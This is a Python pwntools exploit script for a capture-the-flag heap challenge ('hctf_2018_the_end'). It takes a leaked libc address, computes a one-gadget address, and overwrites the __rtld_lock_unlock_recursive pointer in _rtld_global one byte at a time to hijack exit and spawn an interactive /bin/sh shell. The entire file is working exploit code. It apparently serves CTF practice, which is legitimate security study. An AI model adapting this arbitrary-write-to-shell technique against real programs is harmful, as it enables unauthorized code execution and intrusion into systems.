# encoding=utf-8
from pwn import *
from LibcSearcher import *
s = lambda buf: io.send(buf)
sl = lambda buf: io.sendline(buf)
sa = lambda delim, buf: io.sendafter(delim, buf)
sal = lambda delim, buf: io.sendlineafter(delim, buf)
shell = lambda: io.interactive()
r = lambda n=None: io.recv(n)
ra = lambda t=tube.forever:io.recvall(t)
ru = lambda delim: io.recvuntil(delim)
rl = lambda: io.recvline()
rls = lambda n=2**20: io.recvlines(n)
 


elf = ELF('./data/bin/heap23_37_hctf_2018_the_end')
libc = elf.libc
#io = remote("node3.buuoj.cn",26000)
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
io = process('./data/bin/heap23_37_hctf_2018_the_end')
# 获取pie基地址

ru("here is a gift ")
libc.address =  int(r(len("0x7f7819bef2b0")),16)-libc.sym['sleep']
success("libc:"+hex(libc.address))

ogg = libc.address+0xf1247
info("ogg:"+hex(ogg))
_rtld_global = libc.address+0x5f0040
success("_rtld_global:"+hex(_rtld_global))
__rtld_lock_unlock_recursive = _rtld_global+0xf08
success("__rtld_lock_unlock_recursive :"+hex(__rtld_lock_unlock_recursive))

#pause()
s(p64(__rtld_lock_unlock_recursive))
s(p8(ogg&0xff))
info(hex(ogg&0xff))

s(p64(__rtld_lock_unlock_recursive+1))
s(p8((ogg>>8)&0xff))
info(hex((ogg>>8)&0xff))

s(p64(__rtld_lock_unlock_recursive+2))
s(p8((ogg>>16)&0xff))
info(hex((ogg>>16)&0xff))

s(p64(__rtld_lock_unlock_recursive+3))
s(p8((ogg>>24)&0xff))
info(hex((ogg>>24)&0xff))

s(p64(__rtld_lock_unlock_recursive+4))
s(p8((ogg>>32)&0xff))
info(hex((ogg>>32)&0xff))
sl("/bin/sh")
shell()